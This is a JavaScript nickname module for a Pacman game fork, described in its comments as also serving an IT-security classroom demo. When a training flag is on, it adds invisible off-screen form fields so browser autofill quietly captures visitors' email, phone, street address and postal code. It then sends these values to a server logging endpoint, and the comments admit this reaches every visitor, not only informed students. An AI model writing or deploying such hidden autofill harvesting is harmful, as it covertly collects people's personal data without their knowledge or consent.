// Nickname / public-leaderboard identity for this repo's Pacman fork.
// On first visit, prompts for a display name via the #nickname-overlay
// markup in index.htm - a real, single <input name="name"
// autocomplete="name"> field with genuine browser autofill support. The
// typed name itself never leaves the browser: it only ever produces and
// stores a pseudonymous "<NAME>-<HEX>" tag, which is the sole thing
// pacman-canvas.js submits to the public /api/leaderboard.
//
// window.PACMAN_TRAINING_MODE (rendered server-side into index.htm from
// the TRAINING_MODE env var, see server/cmd/server/main.go and
// values.yaml's trainingMode.enabled - default OFF) additionally wires
// this same visible name field into the hidden email/tel/address/postal
// autofill capture already used by fingerprint.js's harvestAutofill() for
// the IT-security classroom demo (see docs/57-pacman-visitor-tracking.md):
// same technique, same hidden fields riding in the *same* <form> as the
// visible name input, because Chrome fills every matching field in a form
// together once the visitor accepts one autofill suggestion. Whatever gets
// harvested here is sent to /api/fingerprint (server-side log only,
// separate pipeline from the public leaderboard - see leaderboard.go vs.
// main.go's handleFingerprint) and never appears in the nickname or on the
// leaderboard. TRAINING_MODE is a deliberate, teacher-controlled toggle:
// while it's on, this applies to *every* visitor of whatever host it's
// enabled on, not just an informed group - see README.md's "Bestenliste"
// section before enabling it on a publicly reachable host.
(function () {
  "use strict";

  var STORAGE_NAME = "pacman.playerName";
  var STORAGE_NICKNAME = "pacman.nickname";

  // FNV-1a 32-bit - same algorithm as fingerprint.js's hashString(): fast,
  // synchronous, no WebCrypto round-trip, only needs to differ between
  // distinguishable inputs.
  function hashHex(str) {
    var hash = 2166136261;
    for (var i = 0; i < str.length; i++) {
      hash ^= str.charCodeAt(i);
      hash = Math.imul(hash, 16777619);
    }
    return (hash >>> 0).toString(16).padStart(8, "0");
  }

  function slugify(name) {
    var slug = (name || "")
      .normalize("NFKD")
      .replace(/[\u0300-\u036f]/g, "")
      .toUpperCase()
      .replace(/[^A-Z0-9]/g, "")
      .slice(0, 12);
    return slug || "PLAYER";
  }

  // Salted with time + randomness so the same name typed twice (different
  // people, or the same person after a reset) doesn't collide on the
  // shared public leaderboard.
  function generateNickname(name) {
    var salt = Date.now().toString(36) + Math.random().toString(36).slice(2);
    var hex = hashHex(name + "|" + salt).slice(-4).toUpperCase();
    return slugify(name) + "-" + hex;
  }

  function readStorage(key) {
    try {
      return localStorage.getItem(key);
    } catch (e) {
      return null;
    }
  }

  function writeStorage(name, nickname) {
    try {
      localStorage.setItem(STORAGE_NAME, name);
      localStorage.setItem(STORAGE_NICKNAME, nickname);
    } catch (e) {}
  }

  function clearStorage() {
    try {
      localStorage.removeItem(STORAGE_NAME);
      localStorage.removeItem(STORAGE_NICKNAME);
    } catch (e) {}
  }

  // Same hidden-field technique as fingerprint.js's harvestAutofill():
  // off-screen (not display:none/visibility:hidden - some browsers exclude
  // those from autofill entirely), same <form> as the visible name input,
  // common autocomplete tokens so a saved browser profile fills them
  // together with the name field. Only ever called when
  // window.PACMAN_TRAINING_MODE === true.
  function addHiddenAutofillFields(form) {
    var fields = [
      { key: "email", autocomplete: "email", type: "email" },
      { key: "tel", autocomplete: "tel", type: "tel" },
      { key: "address", autocomplete: "street-address", type: "text" },
      { key: "postal", autocomplete: "postal-code", type: "text" }
    ];
    var inputs = {};
    fields.forEach(function (f) {
      var input = document.createElement("input");
      input.type = f.type;
      input.name = f.key;
      input.setAttribute("autocomplete", f.autocomplete);
      input.setAttribute("tabindex", "-1");
      input.setAttribute("aria-hidden", "true");
      input.setAttribute("style", "position:absolute; width:1px; height:1px; opacity:0; pointer-events:none;");
      inputs[f.key] = input;
      form.appendChild(input);
    });
    return inputs;
  }

  // Sends whatever the hidden fields picked up to /api/fingerprint - the
  // same endpoint/log line (client_fingerprint) fingerprint.js's own
  // harvestAutofill() already uses, so both correlate the same way in
  // Grafana (see docs/57). Deliberately separate from ajax_add() in
  // pacman-canvas.js, which only ever sends the nickname to the public
  // /api/leaderboard - this data never touches that endpoint.
  function reportHarvestedAutofill(realName, hiddenInputs) {
    var payload = { autofill_name: realName };
    Object.keys(hiddenInputs).forEach(function (key) {
      var val = hiddenInputs[key].value;
      if (val) payload["autofill_" + key] = val;
    });
    fetch("/api/fingerprint", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch(function () {});
  }

  var currentNickname = readStorage(STORAGE_NICKNAME);

  function showOverlay() {
    var overlay = document.getElementById("nickname-overlay");
    if (!overlay) return;
    overlay.style.display = "flex";
    var preview = document.getElementById("nickname-preview");
    if (preview) preview.textContent = "";
    var input = document.getElementById("nickname-input");
    if (input) {
      input.value = "";
      input.focus();
    }
  }

  function hideOverlay() {
    var overlay = document.getElementById("nickname-overlay");
    if (overlay) overlay.style.display = "none";
  }

  function init() {
    var form = document.getElementById("nickname-form");
    if (!form) return;

    var hiddenInputs = null;
    if (window.PACMAN_TRAINING_MODE === true) {
      hiddenInputs = addHiddenAutofillFields(form);
    }

    if (currentNickname) {
      hideOverlay();
    } else {
      showOverlay();
    }

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      var input = document.getElementById("nickname-input");
      var name = (input.value || "").trim();
      if (!name) return;

      currentNickname = generateNickname(name);
      writeStorage(name, currentNickname);

      if (hiddenInputs) reportHarvestedAutofill(name, hiddenInputs);

      var preview = document.getElementById("nickname-preview");
      if (preview) preview.textContent = "Dein Spitzname: " + currentNickname;

      setTimeout(hideOverlay, 900);
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }

  // Exposed for pacman-canvas.js (game-over leaderboard submission) and
  // the "Namen ändern" link in the Info panel.
  window.PacmanNickname = {
    get: function () {
      return currentNickname || readStorage(STORAGE_NICKNAME);
    },
    reset: function () {
      currentNickname = null;
      clearStorage();
      showOverlay();
    }
  };
})();
